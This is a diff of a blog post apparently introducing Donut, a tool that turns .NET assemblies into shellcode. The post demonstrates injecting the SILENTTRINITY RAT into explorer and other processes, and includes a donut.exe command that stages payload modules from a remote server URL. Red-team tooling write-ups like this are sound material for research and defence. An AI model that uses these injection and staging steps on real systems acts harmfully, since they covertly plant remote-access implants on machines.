@@ -145,32 +145,48 @@ In order to reduce the size of your shellcode (or for many other reasons), you m
 .\donut.exe -u http://remote_server.com/modules/ -d ResourceDomain -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
 ```
 
-### Preparing to Inject SILENTTRINITY
+## Demonstrating with SILENTTRINITY
 
+For a demonstration, we will use the [SILENTTRINITY RAT](https://github.com/byt3bl33d3r/SILENTTRINITY "SILENTTRINITY") as a test payload. Since it is the most... ahh... complicated .NET Assembly that I could find, I used it for all of my testing. You may use any standard shellcode injection technique to inject the .NET Assembly. The DonutTest subproject is provided in the repo as an example injector. You may combine it with the DemoCreateProcess subproject to test the shellcode generator. In our case, we will first use DonutTest to inject into explorer. We also show what it looks like to use an existing implant to perform further injection using the ``` boo/shellcode ``` and ``` ipy/execute-assembly ``` post-exploitation modules.
+
+### Generation
+
+First, we will generate a x64 PIC using the SILENTTRINITY DLL. Using PowerShell, we will base64-encode the result and pipe it to our clipboard.
 
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ST_generate_and_copy.png)
 
+Because we don't know what processes will be available to inject into on-target, we will also generate a x86 PIC. 
+
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ST_generate_and_copy_86.png)
+
+If you wanted to, you could use a staging server by providing the URL and copying the Donut Module to 
 
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/generate_URL.png)
 
-## Choosing a Host Process
+### Choosing a Host Process
 
-Use ProcessManager, a sub project, to enumerate processes.
+Use ProcessManager, a sub project, to enumerate processes. ProcessManager enumerates all running processesm and makes a best effort to obtain information about them. It is specifically designed to be used for determining what process to inject / migrate into. The picture below demonstrates its general usage.
 
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ProcessManager.jpg)
 
-## Injecting
+### Injecting
 
-You may use any standard shellcode injection technique to inject the .NET Assembly. The DonutTest subproject is provided in the repo as an example injector. You may combine it with the DemoCreateProcess subproject to test the shellcode generator. However, for demonstration purposes, we will use the SILENTTRINITY RAT as a test payload. Since it is the most... ahh... complicated .NET Assembly that I could find, I used it for all of my testing.
+First, we will use DonutTest to inject into explorer using DonutTest.
 
-![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ST_inject.png)
+![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ST_inject.jpg)
+
+As you can see, the injection was successfull:
 
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ST_success.png)
 
+Now assume we already have an agent running on the machine. We can use SILENTTRINITY's post-exploitation modules to inject implants into running processes.
+
+![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ST_through_agent.png)
+
+
 ## Using as a Library
 
-donut is provided as both dynamic and static libraries for both Linux (*.a* / *.so*) and Windows(*.lib* / *.dll*). It has a simple API that is described in *api.html*. Two exported functions are provided, ``` int DonutCreate(PDONUT_CONFIG c) ``` and ``` int DonutDelete(PDONUT_CONFIG c) ``` .
+donut is provided as both dynamic and static libraries for both Linux (*.a* / *.so*) and Windows(*.lib* / *.dll*). It has a simple API that is described in *docs\api.html*. Two exported functions are provided, ``` int DonutCreate(PDONUT_CONFIG c) ``` and ``` int DonutDelete(PDONUT_CONFIG c) ``` .
 
 ## Rebuilding the shellcode
 
